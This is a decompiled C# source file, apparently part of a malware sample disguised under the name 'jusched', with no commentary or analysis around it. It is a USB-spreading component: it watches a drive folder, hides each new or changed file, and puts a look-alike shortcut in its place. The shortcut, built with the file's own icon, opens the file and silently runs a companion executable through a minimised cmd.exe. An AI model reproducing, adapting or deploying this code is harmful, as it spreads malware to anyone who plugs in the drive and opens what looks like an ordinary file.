using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace jusched;

public class Watcher
{
	private static FileSystemWatcher watchfolder = new FileSystemWatcher();

	public static string sourceunit;

	[DebuggerNonUserCode]
	public Watcher()
	{
	}

	public static void Run()
	{
		FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
		fileSystemWatcher.Path = sourceunit;
		fileSystemWatcher.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
		fileSystemWatcher.Filter = "*.*";
		fileSystemWatcher.Changed += OnChanged;
		fileSystemWatcher.Created += OnCreated;
		fileSystemWatcher.EnableRaisingEvents = true;
	}

	private static void OnChanged(object sender, FileSystemEventArgs e)
	{
		if (!e.FullPath.Contains(".lnk"))
		{
			do_work(e.FullPath);
		}
	}

	private static void OnCreated(object sender, FileSystemEventArgs e)
	{
		if (!e.FullPath.Contains(".lnk"))
		{
			do_work(e.FullPath);
		}
	}

	private static void do_work(string fpath)
	{
		string usbname = Configuration.usbname;
		string text = sourceunit;
		string text2 = "%windir%\\system32\\";
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
		if (Operators.CompareString(Path.GetFileNameWithoutExtension(fpath), usbname, false) == 0)
		{
			return;
		}
		if (!fpath.Contains(".lnk") | !fpath.Contains("~"))
		{
			try
			{
				File.SetAttributes(fpath, FileAttributes.Hidden);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (!fpath.Contains("~"))
		{
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { text + Path.GetFileNameWithoutExtension(fpath) + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
			object obj = objectValue2;
			NewLateBinding.LateSet(obj, (Type)null, "TargetPath", new object[1] { text2 + "cmd.exe" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "WorkingDirectory", new object[1] { text }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "WindowStyle", new object[1] { 7 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "Arguments", new object[1] { "start /min /C \"\".\\" + Path.GetFileName(fpath) + "\" | \".\\" + usbname + ".exe\" | taskkill /F /IM cmd.exe\"" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "IconLocation", new object[1] { fpath + "," + Conversions.ToString(0) }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			obj = null;
		}
	}
}
